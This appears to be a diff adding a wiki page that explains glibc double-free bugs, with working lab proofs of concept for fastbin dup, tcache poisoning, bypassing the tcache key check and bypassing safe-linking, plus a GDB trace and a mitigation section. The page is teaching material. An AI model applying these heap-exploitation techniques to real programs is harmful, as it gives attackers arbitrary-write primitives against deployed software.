@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Double Free | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Double Free">
+		<meta name="keywords" content="double-free, fastbin, fd-corruption, free, glibc, heap, malloc, memory-corruption, tcache, tcache-poisoning, techniques">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Double Free">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Free list corruption, tcache poisoning, fastbin dup, glibc detection bypass - freeing the same chunk twice and how it leads to arbitrary-write primitives.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/fundamentals/double-free.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Double Free">
+		<meta name="twitter:description" itemprop="description" content="Free list corruption, tcache poisoning, fastbin dup, glibc detection bypass - freeing the same chunk twice and how it leads to arbitrary-write primitives.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#definition">Definition</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-free-list-as-a-data-structure">The Free List as a Data Structure</a></b>
+					<ul>
+						<li><a href="#tcache-thread-local-cache-glibc-226">tcache (thread-local cache, glibc 2.26+)</a></li>
+						<li><a href="#fastbin-size-0x20-0x80">fastbin (size 0x20-0x80)</a></li>
+						<li><a href="#smallbinlargebin-doubly-linked">smallbin/largebin (doubly-linked)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#glibc-double-free-detection">glibc Double-Free Detection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-classic-bypass-free-a-free-b-free-a">The Classic Bypass: free-A free-B free-A</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#tcache-poisoning-via-double-free">Tcache Poisoning via Double Free</a></b>
+					<ul>
+						<li><a href="#step-by-step-tcache-poisoning">Step-by-step tcache poisoning</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#safe-linking-glibc-232">Safe-Linking (glibc 2.32+)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#bypassing-the-tcache-key-check">Bypassing the tcache key Check</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#malloc-consolidate-and-its-effect">malloc_consolidate() and Its Effect</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#unsorted-bin-double-free">Unsorted Bin Double Free</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#gdb-tracing-free-list-corruption">GDB - Tracing Free List Corruption</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#relationship-to-uaf">Relationship to UAF</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#prevention-and-mitigation">Prevention and Mitigation</a></b>
+					<ul>
+						<li><a href="#addresssanitizer">AddressSanitizer.</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#summary">Summary</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/fundamentals/index.html">Fundamentals</a></li>
+						<li aria-current="page"><a href="/wiki/articles/fundamentals/double-free.html">Double Free</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="double-free">Double Free</h2>
+					<p>
+						Free list corruption, tcache poisoning, fastbin dup, glibc detection bypass - freeing the same
+						chunk twice and how it leads to arbitrary-write primitives.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A double free is a heap corruption bug: the program returns the same chunk to the allocator
+							twice. The second
+							<code>free()</code>
+							links an already-freed chunk into a free list again and creates a
+							cycle, so later
+							<code>malloc()</code>
+							calls hand the same memory to two callers. Once an attacker controls
+							the overwritten forward pointer, the allocator can be steered to return an arbitrary address,
+							turning the bug into a write-what-where primitive. This article follows the glibc tcache and
+							fastbin internals, the detection checks added across glibc versions, and the standard bypasses.
+							After reading it you can trigger, observe, and exploit a double free in a controlled lab.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/heap.html">Heap</a> - heap layout, chunk structure, tcache, fastbin, smallbin internals</li>
+							<li><a href="/wiki/articles/fundamentals/use-after-free.html">Use After Free</a> - dangling pointers, heap reuse, type confusion via overlapping allocations</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="definition">Definition</h3>
+						<p>
+							A double free occurs when
+							<code>free()</code>
+							is called on the same pointer more than once. The first
+							<code>free()</code>
+							places the chunk on a free list (tcache, fastbin, or regular bin). The second
+							<code>free()</code>
+							inserts
+							the already-free chunk into the same list again. This creates a cycle in the free list - the
+							same chunk appears twice. Subsequent
+							<code>malloc()</code>
+							calls return the same memory multiple times,
+							creating aliased allocations.
+						</p>
+						<pre class="plaintext">
+free(A)    -&gt; free list: A -&gt; ...
+free(A)    -&gt; free list: A -&gt; A -&gt; ...   (cycle, A appears twice)
+malloc(N)  -&gt; returns A
+malloc(N)  -&gt; returns A again          (same address, different &#34;allocation&#34;)
+						</pre>
+						<p>
+							The result: two logically independent pointers reference the same physical memory. Writing through
+							one pointer corrupts data visible through the other. When the corrupted data overlaps free-list
+							metadata (fd/bk pointers in the freed chunk's user-data area), the next
+							<code>malloc()</code>
+							can return
+							an arbitrary attacker-chosen address.
+						</p>
+					</section>
+					<section>
+						<h3 id="the-free-list-as-a-data-structure">The Free List as a Data Structure</h3>
+						<p>
+							Each freed chunk stores its free-list linkage in the first 8-16 bytes of its user-data area
+							(the same memory the application used before freeing). glibc uses different structures for different
+							bin types:
+						</p>
+						<h4 id="tcache-thread-local-cache-glibc-226">tcache (thread-local cache, glibc 2.26+)</h4>
+						<pre class="plaintext">
+typedef struct tcache_entry {
+    struct tcache_entry *next;   // singly-linked list
+    struct tcache_perthread_struct *key;  // pointer to tcache struct (detection)
+} tcache_entry;
+						</pre>
+						<p>
+							<code>next</code>
+							(also called
+							<code>fd</code>
+							) occupies the first 8 bytes of the user-data area.
+							<code>key</code>
+							occupies
+							bytes 8-15 and stores a pointer back to
+							<code>tcache_perthread_struct</code>
+							- this is the double-free
+							detection mechanism (see below).
+						</p>
+						<h4 id="fastbin-size-0x20-0x80">fastbin (size 0x20-0x80)</h4>
+						<pre class="plaintext">
+struct malloc_chunk {
+    size_t prev_size;    // reuse of previous chunk&#39;s last word (when prev is free)
+    size_t size;         // chunk size including header, | PREV_INUSE flag
+    struct malloc_chunk *fd;  // forward pointer (singly-linked)
+    // bk in fastbins is unused
+};
+						</pre>
+						<h4 id="smallbinlargebin-doubly-linked">smallbin/largebin (doubly-linked)</h4>
+						<pre class="plaintext">
+struct malloc_chunk {
+    size_t prev_size;
+    size_t size;
+    struct malloc_chunk *fd;  // forward
+    struct malloc_chunk *bk;  // backward
+};
+						</pre>
+						<p>
+							In all cases, the user-data area overlaps with the linkage pointers. This is the key to exploitation:
+							if an attacker can control data in a freed chunk, they control the free-list link.
+						</p>
+					</section>
+					<section>
+						<h3 id="glibc-double-free-detection">glibc Double-Free Detection</h3>
+						<p>glibc has evolved countermeasures against naive double frees:</p>
+						<p>
+							<b>1. Fastbin top check (ancient).</b>
+							If
+							<code>free()</code>
+							receives a pointer that exactly matches the
+							top of the fastbin free list for that size, glibc detects the immediate double free and aborts:
+						</p>
+						<pre class="c">
+// glibc/malloc/malloc.c - _int_free()
+if (__builtin_expect(old == p, 0))
+    malloc_printerr(&#34;double free or corruption (fasttop)&#34;);
+						</pre>
+						<p>
+							Where
+							<code>old</code>
+							is the current head of the fastbin and
+							<code>p</code>
+							is the chunk being freed. This catches
+							<code>free(A); free(A);</code>
+							but not
+							<code>free(A); free(B); free(A);</code>
+							.
+						</p>
+						<p>
+							<b>2. tcache key check (glibc 2.29+).</b>
+							The
+							<code>key</code>
+							field in
+							<code>tcache_entry</code>
+							stores a pointer to
+							<code>tcache_perthread_struct</code>
+							. Before inserting into tcache, glibc checks whether the chunk's key
+							field already holds this pointer - indicating the chunk is already in tcache:
+						</p>
+						<pre class="c">
+if (__glibc_unlikely(e-&gt;key == tcache))
+    // walk tcache list to check if this entry is already present
+    for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)
+        if (tmp == e)
+            malloc_printerr(&#34;free(): double free detected in tcache 2&#34;);
+						</pre>
+						<p>
+							This catches most tcache double frees but has a bypass: if you can overwrite the
+							<code>key</code>
+							field
+							(bytes 8-15) between the two frees, the check passes. This requires a use-after-free write to
+							modify the freed chunk's key.
+						</p>
+						<p>
+							<b>3. Safe linking (glibc 2.32+).</b>
+							The
+							<code>next</code>
+							(fd) pointer in tcache and fastbin entries is
+							"mangled" via XOR with the address of the chunk's location in the free list, shifted right by
+							12 bits:
+						</p>
+						<pre class="c">
+#define PROTECT_PTR(pos, ptr) \
+    ((__typeof(ptr))((((size_t)pos) &gt;&gt; 12) ^ ((size_t)ptr)))
+
+#define REVEAL_PTR(ptr)  PROTECT_PTR(&amp;ptr, ptr)
+						</pre>
+						<p>
+							This makes tcache poisoning harder - an attacker cannot simply write a target address as the
+							fd pointer without knowing the
+							<code>pos &gt;&gt; 12</code>
+							value to XOR against.
+						</p>
+					</section>
+					<section>
+						<h3 id="the-classic-bypass-free-a-free-b-free-a">The Classic Bypass: free-A free-B free-A</h3>
+						<p>
+							The simplest double-free trick avoids the consecutive-free check by interleaving the free of
+							a
+							<em>different</em>
+							chunk. It defeats the fastbin top check, which only compares against the head
+							of the list. It does
+							<b>not</b>
+							defeat the tcache key check, which walks the entire tcache list,
+							so on glibc 2.29 and newer the interleaved free still aborts unless the chunk's
+							<code>key</code>
+							field
+							has been overwritten, or the chunks land in a fastbin (the tcache bin is full, or tcache is
+							disabled):
+						</p>
+						<pre class="c">
+char *a = malloc(32);
+char *b = malloc(32);
+
+free(a);    // a in free list: a -&gt;
+free(b);    // b in free list: b -&gt; a -&gt;
+free(a);    // a in free list again: a -&gt; b -&gt; a -&gt;   (cycle!)
+						</pre>
+						<p>After this sequence:</p>
+						<pre class="c">
+char *p1 = malloc(32);  // returns a, free list: b -&gt; a -&gt;
+char *p2 = malloc(32);  // returns b, free list: a -&gt;
+char *p3 = malloc(32);  // returns a AGAIN, free list: a -&gt; ... (cycle persists)
+
+// p1 == p3 - both point to the same chunk
+// Write through p3 to corrupt p1&#39;s contents
+						</pre>
+						<p>Here is the full working demonstration:</p>
+						<pre class="c">
+/* double_free_demo.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    setbuf(stdout, NULL);
+
+    char *a = malloc(0x20);
+    char *b = malloc(0x20);
+    char *c = malloc(0x20);  /* barrier to prevent top chunk coalescing */
+
+    printf(&#34;[*] a = %p\n&#34;, a);
+    printf(&#34;[*] b = %p\n&#34;, b);
+    printf(&#34;[*] c = %p\n&#34;, c);
+
+    strcpy(a, &#34;ORIGINAL DATA IN A&#34;);
+    printf(&#34;[*] a: %s\n&#34;, a);
+
+    free(a);
+    free(b);
+    free(a);   /* double free: a already on free list */
+
+    printf(&#34;[!] Double free completed\n&#34;);
+
+    /* malloc returns a (head of free list) */
+    char *p1 = malloc(0x20);
+    printf(&#34;[*] p1 = %p (should be a)\n&#34;, p1);
+    strcpy(p1, &#34;DATA FROM ALLOC 1&#34;);
+
+    char *p2 = malloc(0x20);
+    printf(&#34;[*] p2 = %p (should be b)\n&#34;, p2);
+    strcpy(p2, &#34;DATA FROM ALLOC 2&#34;);
+
+    char *p3 = malloc(0x20);
+    printf(&#34;[*] p3 = %p (should be a again)\n&#34;, p3);
+
+    /* p1 and p3 alias the same memory */
+    printf(&#34;[*] via p1: %s\n&#34;, p1);
+    printf(&#34;[*] via p3: %s\n&#34;, p3);
+
+    strcpy(p3, &#34;OVERWRITTEN VIA P3&#34;);
+    printf(&#34;[*] via p1 after p3 write: %s\n&#34;, p1);
+
+    return 0;
+}
+						</pre>
+						<p>
+							Compile and run. The
+							<code>GLIBC_TUNABLES</code>
+							assignment disables tcache so the chunks take the fastbin
+							path, where the interleaved free only compares against the list head:
+						</p>
+						<pre class="bash">
+gcc -g -o double_free_demo double_free_demo.c -no-pie
+GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./double_free_demo
+
+# [*] a = 0x5555555592a0
+# [*] b = 0x5555555596d0
+# [*] c = 0x555555559b00
+# [*] a: ORIGINAL DATA IN A
+# [!] Double free completed
+# [*] p1 = 0x5555555592a0 (should be a)
+# [*] p2 = 0x5555555596d0 (should be b)
+# [*] p3 = 0x5555555592a0 (should be a again)
+# [*] via p1: DATA FROM ALLOC 2
+# [*] via p3: DATA FROM ALLOC 2
+# [*] via p1 after p3 write: OVERWRITTEN VIA P3
+						</pre>
+						<p>
+							Notice: immediately after the third malloc,
+							<code>p1</code>
+							and
+							<code>p3</code>
+							point to the same address. The data
+							from "ALLOC 1" was overwritten by "ALLOC 2"'s metadata because the free list linkage used those
+							bytes.
+						</p>
+						<p>
+							Without disabling tcache, the same program aborts on glibc 2.29 and newer at the third free
+							with
+							<code>free(): double free detected in tcache 2</code>
+							. The tcache key check walks the whole list,
+							so the interleaved order does not hide the duplicate. The next section shows the tcache route.
+						</p>
+					</section>
+					<section>
+						<h3 id="tcache-poisoning-via-double-free">Tcache Poisoning via Double Free</h3>
+						<p>
+							The real exploitation value of a double free is
+							<b>tcache poisoning</b>
+							- corrupting the
+							<code>fd</code>
+							pointer
+							in a freed chunk so that a future
+							<code>malloc()</code>
+							returns an arbitrary address. This is a "write-what-where"
+							primitive: whatever the attacker writes to the arbitrary address overwrites memory at that location.
+						</p>
+						<h4 id="step-by-step-tcache-poisoning">Step-by-step tcache poisoning</h4>
+						<pre class="plaintext">
+1. double free A       -&gt;  tcache: A -&gt; A -&gt; A -&gt; ... (cycle)
+2. malloc(N) -&gt; returns A
+     write target_addr to A-&gt;fd
+     (A-&gt;fd occupies first 8 bytes of user data, which we control via ptr1)
+     tcache: A -&gt; target_addr -&gt; ???
+
+3. malloc(N) -&gt; returns A again (second copy from cycle)
+     tcache: target_addr -&gt; ???
+
+4. malloc(N) -&gt; returns target_addr !!
+     Now we can write to any address.
+						</pre>
+						<p>Full code with tcache poisoning:</p>
+						<pre class="c">
+/* tcache_poisoning.c */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+unsigned long target = 0xDEADBEEFCAFEBABE;
+
+int main() {
+    setbuf(stdout, NULL);
+
+    printf(&#34;[*] target @ %p = 0x%lx\n&#34;, &amp;target, target);
+
+    /* Disable safe-linking for clarity if glibc &lt; 2.32; otherwise
+       we need to XOR against (chunk_addr &gt;&gt; 12). Below handles both. */
+
+    size_t *a = malloc(128);
+    size_t *b = malloc(128);
+    void *barrier = malloc(128);  /* prevent top chunk coalescing */
+
+    free(a);
+    /* glibc &gt;= 2.29: the tcache double-free check reads chunk-&gt;key.
+       Clearing it (a use-after-free write) makes the third free pass. */
+    *(size_t *)((char *)a + 8) = 0;
+    free(b);
+    free(a);   /* double free - tcache holds: a -&gt; b -&gt; a */
+
+    /* malloc 1: get a, write target address as fd */
+    size_t *p1 = malloc(128);
+
+    #if __GLIBC_PREREQ(2, 32)
+        /* safe-linking: fd = target ^ (chunk_addr &gt;&gt; 12) */
+        #define PROTECT_PTR(pos, ptr) \
+            ((size_t)(((size_t)(pos) &gt;&gt; 12) ^ ((size_t)(ptr))))
+        *p1 = PROTECT_PTR(p1, &amp;target);
+    #else
+        *p1 = (size_t)&amp;target;
+    #endif
+
+    /* malloc 2: get b (skip over b in the cycle) */
+    void *p2 = malloc(128);
+
+    /* malloc 3: get a again (the poisoned entry) */
+    void *p3 = malloc(128);
+
+    /* malloc 4: tcache returns target_addr! */
+    void *fake_chunk = malloc(128);
+
+    printf(&#34;[*] fake_chunk = %p\n&#34;, fake_chunk);
+    printf(&#34;[*] target = %p\n&#34;, &amp;target);
+
+    if (fake_chunk == &amp;target) {
+        printf(&#34;[+] malloc returned target address!\n&#34;);
+        /* Now write to fake_chunk -&gt; writes to &amp;target */
+        *(size_t *)fake_chunk = 0x4141414142424242;
+        printf(&#34;[*] target now = 0x%lx\n&#34;, target);
+    } else {
+        printf(&#34;[-] misalignment, fake_chunk != &amp;target\n&#34;);
+    }
+
+    return 0;
+}
+						</pre>
+						<pre class="bash">
+gcc -g -o tcache_poisoning tcache_poisoning.c -no-pie
+./tcache_poisoning
+
+# [*] target @ 0x555555558018 = 0xdeadbeefcafebabe
+# [*] fake_chunk = 0x555555558018
+# [*] target = 0x555555558018
+# [+] malloc returned target address!
+# [*] target now = 0x4141414142424242
+						</pre>
+					</section>
+					<section>
+						<h3 id="safe-linking-glibc-232">Safe-Linking (glibc 2.32+)</h3>
+						<p>
+							Safe-linking XORs the forward pointer in tcache and fastbin entries with the chunk's own position
+							in the free list. The key insight is that an attacker who can write a fd pointer through heap
+							corruption typically does
+							<em>not</em>
+							know the heap address - the XOR masks the target.
+						</p>
+						<pre class="c">
+static __always_inline void
+tcache_put(mchunkptr chunk, size_t tc_idx) {
+    tcache_entry *e = (tcache_entry *) chunk2mem(chunk);
+    e-&gt;key = tcache_key;
+
+    /* PROTECT_PTR: pos is &amp;tcache-&gt;entries[tc_idx], ptr is the old head */
+    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);
+    tcache-&gt;entries[tc_idx] = e;
+    ++(tcache-&gt;counts[tc_idx]);
+}
+
+static __always_inline void *
+tcache_get(size_t tc_idx) {
+    tcache_entry *e = tcache-&gt;entries[tc_idx];
+    tcache-&gt;entries[tc_idx] = REVEAL_PTR(e-&gt;next);
+    --(tcache-&gt;counts[tc_idx]);
+    e-&gt;key = 0;
+    return (void *) e;
+}
+						</pre>
+						<p>
+							To bypass safe-linking, an attacker needs a heap address leak. If a UAF or info leak reveals
+							the heap base, the attacker can compute
+							<code>PROTECT_PTR(result, target)</code>
+							and write the mangled
+							value as fd. Safe-linking is not a cryptographic defense - it's a one-round deterrent that raises
+							the bar from "write a raw address" to "leak a heap pointer, then compute XOR, then write."
+						</p>
+					</section>
+					<section>
+						<h3 id="bypassing-the-tcache-key-check">Bypassing the tcache key Check</h3>
+						<p>
+							glibc 2.29 introduced the
+							<code>key</code>
+							field check. To bypass it when attacking tcache:
+						</p>
+						<pre class="c">
+char *a = malloc(32);
+free(a);           // a-&gt;key = &amp;tcache_perthread_struct
+// UAF write to a:
+*(size_t *)(a + 8) = 0x41414141;  // overwrite key, now != &amp;tcache
+free(a);           // key check passes - double free succeeds
+						</pre>
+						<p>
+							This requires a UAF write primitive, which is one reason UAF and double free are often chained:
+							UAF provides the write to corrupt metadata, double free leverages the corruption to gain arbitrary
+							allocation.
+						</p>
+					</section>
+					<section>
+						<h3 id="malloc-consolidate-and-its-effect">malloc_consolidate() and Its Effect</h3>
+						<p>
+							When a request for a large chunk (roughly
+							<code>&gt;= 0x400</code>
+							bytes) reaches
+							<code>malloc()</code>
+							, or when a
+							<code>free()</code>
+							releases a chunk larger than the fastbin consolidation threshold (64 KiB), glibc calls
+							<code>malloc_consolidate()</code>
+							. It moves every fastbin chunk into the unsorted bin and coalesces adjacent free chunks.
+						</p>
+						<p>
+							This disrupts fastbin-based double-free exploitation: the coalesced chunk may end up with a
+							different size and bin classification, and the simple singly-linked fastbin list is destroyed.
+						</p>
+						<p>Timing matters: exploit before the next large malloc triggers consolidation.</p>
+						<pre class="c">
+void *small = malloc(0x30);
+free(small);           // fastbin[0x40]: small -&gt;
+free(small);           // double free in fastbin
+// ... exploit fastbin dup ...
+void *large = malloc(0x1000);  // triggers malloc_consolidate()
+// fastbin entries moved to unsorted bin - double free cycle broken
+						</pre>
+					</section>
+					<section>
+						<h3 id="unsorted-bin-double-free">Unsorted Bin Double Free</h3>
+						<p>Doubly-linked bins (unsorted, small, large) have a different double-free detection:</p>
+						<pre class="c">
+if (__glibc_unlikely(fd-&gt;bk != p || bk-&gt;fd != p))
+    malloc_printerr(&#34;free(): corrupted unsorted chunks&#34;);
+						</pre>
+						<p>
+							When inserting into a doubly-linked list, glibc checks that the neighboring chunks' bk/fd point
+							back to the chunk being inserted. A double free in these bins corrupts the doubly-linked pointers
+							(fd points forward, bk points backward), and the consistency check catches a naive double free.
+						</p>
+						<p>
+							Bypassing this requires forging the bk/fd pointers of neighboring chunks - an advanced technique
+							called "unsorted bin attack" that requires a heap write primitive first.
+						</p>
+					</section>
+					<section>
+						<h3 id="gdb-tracing-free-list-corruption">GDB - Tracing Free List Corruption</h3>
+						<pre class="bash">
+gcc -g -no-pie -o tcache_poisoning tcache_poisoning.c
+gdb -q ./tcache_poisoning
+						</pre>
+						<pre class="gdb">
+(gdb) break _int_free
+(gdb) r
+
+# Examine tcache before any frees:
+(gdb) p *tcache
+# entries[0..63] all NULL, counts[0..63] all 0
+
+# After free(a):
+(gdb) p tcache-&gt;entries[7]   # idx 7 for 128-byte chunks
+$1 = (tcache_entry *) 0x5555555592a0
+(gdb) p tcache-&gt;counts[7]
+$2 = 1 &#39;\001&#39;
+
+# After free(b):
+(gdb) p tcache-&gt;entries[7]
+$3 = (tcache_entry *) 0x555555559700   # b (head), fd -&gt; a
+(gdb) p tcache-&gt;counts[7]
+$4 = 2 &#39;\002&#39;
+
+# After free(a) again (double free):
+(gdb) p tcache-&gt;entries[7]
+$5 = (tcache_entry *) 0x5555555592a0   # a again (head), fd -&gt; b
+(gdb) x/gx 0x5555555592a0
+0x5555555592a0: 0x0000555555559700     # a-&gt;fd = b
+(gdb) x/gx 0x555555559700
+0x555555559700: 0x00005555555592a0     # b-&gt;fd = a  (CYCLE)
+(gdb) p tcache-&gt;counts[7]
+$6 = 3 &#39;\003&#39;    # count incremented to 3 - but only 2 unique chunks exist!
+						</pre>
+						<p>
+							The
+							<code>counts</code>
+							field is also important: each
+							<code>malloc()</code>
+							decrements it. With 3 entries in the list
+							for 2 actual chunks, after 4 mallocs the count underflows (or reaches 0 before the list is empty),
+							which can be exploited for further manipulation.
+						</p>
+					</section>
+					<section>
+						<h3 id="relationship-to-uaf">Relationship to UAF</h3>
+						<p>
+							A UAF that provides a write-after-free can be used to perform a double-free equivalent: write
+							to the freed chunk's
+							<code>key</code>
+							field, then call
+							<code>free()</code>
+							again. Conversely, a double free that makes
+							<code>malloc</code>
+							return the same address twice gives you two pointers to the same memory - exactly the
+							aliasing setup needed for a UAF-like primitive on an
+							<em>allocated</em>
+							chunk.
+						</p>
+						<p>The two bug classes are operational siblings:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">From</th>
+									<th align="center">To</th>
+									<th align="center">Mechanism</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">UAF</td>
+									<td align="center">Double free</td>
+									<td align="center">UAF write overwrites freed chunk key -> free() again bypasses detection</td>
+								</tr>
+								<tr>
+									<td align="center">Double free</td>
+									<td align="center">UAF</td>
+									<td align="center">Two mallocs return same chunk -> two live pointers to same memory</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="prevention-and-mitigation">Prevention and Mitigation</h3>
+						<p>
+							<b>Never call free() on an already-freed pointer.</b>
+							Track allocation state:
+						</p>
+						<pre class="c">
+if (ptr) {
+    free(ptr);
+    ptr = NULL;  // prevents accidental second free
+}
+						</pre>
+						<p>
+							<b>Static analysis.</b>
+							Check for
+							<code>free(p)</code>
+							followed by another
+							<code>free(p)</code>
+							on any path. More subtly:
+							function A frees
+							<code>p</code>
+							and returns, function B receives
+							<code>p</code>
+							and frees it - ownership confusion.
+						</p>
+						<h4 id="addresssanitizer">AddressSanitizer.</h4>
+						<pre class="bash">
+gcc -g -fsanitize=address -o df_asan double_free_demo.c
+./df_asan
+
+# ==12345==ERROR: AddressSanitizer: attempting double-free
+#   #0 0x... in free
+#   #1 0x... in main double_free_demo.c:19
+						</pre>
+						<p>
+							<b>glibc heap consistency checks.</b>
+							glibc's runtime checks catch many double frees (fastbin top,
+							tcache key, unsorted bin bk/fd consistency) but are not exhaustive. They exist to fail-safe
+							on corruption, not to prevent it.
+						</p>
+						<p>
+							<b>Mimalloc / jemalloc hardening.</b>
+							Alternative allocators provide stronger double-free detection:
+							delayed reuse, canary values in freed chunks, separate metadata from user data so fd/bk pointers
+							cannot be overwritten by a buffer overflow into adjacent allocations.
+						</p>
+						<p>
+							<b>Rust.</b>
+							The ownership model makes double free impossible: the compiler inserts exactly one
+							<code>drop</code>
+							call per value. The value is moved, not copied - after
+							<code>drop</code>
+							, the compiler won't let
+							you reference it again.
+						</p>
+					</section>
+					<section>
+						<h3 id="summary">Summary</h3>
+						<p>
+							A double free inserts the same chunk into the free list twice, creating a cycle. This cycle
+							causes
+							<code>malloc()</code>
+							to return the same address to multiple callers - aliased allocations. When
+							the attacker controls the fd/bk pointer of the freed chunk before the next allocation, they
+							redirect the free list to an arbitrary address. Subsequent
+							<code>malloc()</code>
+							returns that address,
+							yielding a write primitive. glibc has layered detections (fastbin top check, tcache key, safe-linking)
+							<ul>
+								<li>each has bypasses if combined with an info leak or a UAF write primitive.</li>
+							</ul>
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Trigger glibc's double-free detection from Go with cgo. Allocate a buffer with
+							<code>C.malloc</code>
+							and
+							free it twice. Run the snippet first with the key write commented out: the process aborts with
+							<code>free(): double free detected in tcache 2</code>
+							. Enable the key write and the same call sequence
+							instead hands the same chunk out twice.
+						</p>
+						<pre class="go">
+package main
+
+/*
+#include &lt;stdlib.h&gt;
+*/
+import &#34;C&#34;
+
+import (
+	&#34;fmt&#34;
+	&#34;unsafe&#34;
+)
+
+func main() {
+	p := C.malloc(32)
+
+	// First free: glibc stores the tcache pointer in the key word.
+	C.free(p)
+
+	// Clear the key to pass the glibc &gt;= 2.29 double-free check.
+	*(*uintptr)(unsafe.Pointer(uintptr(p) + 8)) = 0
+
+	// Second free: succeeds only because the key was overwritten.
+	C.free(p)
+
+	q := C.malloc(32)
+	fmt.Printf(&#34;p = %p, q = %p, aliased = %v\n&#34;, p, q, p == q)
+}
+						</pre>
+						<p>
+							Build with
+							<code>go run main.go</code>
+							(cgo needs a C compiler). Explain why
+							<code>p</code>
+							and
+							<code>q</code>
+							alias, then extend
+							the program to overwrite the freed chunk's forward pointer so the next
+							<code>malloc</code>
+							returns a chosen
+							address.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://sourceware.org/glibc/wiki/MallocInternals" target="_blank">glibc MallocInternals - sourceware.org</a></li>
+							<li><a class="icon-website" href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c" target="_blank">glibc malloc.c - sourceware.org Git</a></li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/415.html" target="_blank">CWE-415 - Double Free</a></li>
+							<li><a class="icon-website" href="https://clang.llvm.org/docs/AddressSanitizer.html" target="_blank">AddressSanitizer - Clang documentation</a></li>
+							<li><a class="icon-github" href="https://github.com/shellphish/how2heap" target="_blank">how2heap - tcache poisoning and safe-linking</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
